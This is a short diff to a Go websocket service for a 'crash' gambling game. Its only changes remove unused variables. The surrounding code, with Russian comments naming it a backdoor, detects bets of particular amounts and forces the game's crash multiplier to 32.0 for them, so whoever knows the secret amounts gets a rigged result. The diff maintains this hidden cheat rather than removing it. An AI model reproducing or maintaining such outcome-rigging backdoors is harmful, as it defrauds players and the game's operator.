@@ -257,7 +257,6 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 	// Определяем, является ли текущая игра бэкдором
 	backdoorExists := false
 	backdoorType := ""
-	isCriticalBackdoor := false
 	targetCrashPoint := currentGame.CrashPointMultiplier
 	
 	// Проверяем все активные ставки на бэкдоры
@@ -271,7 +270,6 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 			targetCrashPoint = 32.0
 			backdoorExists = true
 			backdoorType = "538"
-			isCriticalBackdoor = true
 			logger.Info("ОБНАРУЖЕН БЭКДОР 538: Установка множителя 32.0 для игры %d", currentGame.ID)
 			break
 		} else if math.Abs(bet.Amount - 76.0) < 0.1 {
@@ -501,7 +499,7 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 				}
 				
 				ws.mu.Lock()
-				for userId, conn := range connections {
+				for _, conn := range connections {
 					err := conn.WriteJSON(multiplierInfo)
 					if err != nil {
 						logger.Error("Не удалось отправить принудительное обновление множителя: %v", err)
